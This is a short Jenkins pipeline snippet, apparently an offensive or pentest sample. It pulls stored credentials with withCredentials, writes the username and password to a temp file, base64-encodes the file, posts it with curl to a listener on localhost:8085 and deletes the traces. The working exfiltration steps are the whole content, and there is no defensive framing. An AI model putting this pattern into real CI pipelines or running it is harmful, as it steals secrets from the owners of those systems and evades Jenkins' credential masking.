pipeline {
  stages {
   	withCredentials([usernamePassword(credentialsId: 'USER', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD')]) {

		sh '''echo "[+] USER:" > /tmp/file
		      echo "$USERNAME" >> /tmp/file
		      echo "$PASSWORD" >> /tmp/file
		      echo >> /tmp/file
		'''
		sh '''base64 /tmp/file > /tmp/out
		      curl -d @/tmp/out http://localhost:8085
		      rm /tmp/file
		      rm /tmp/out
		'''
	}
  }
}
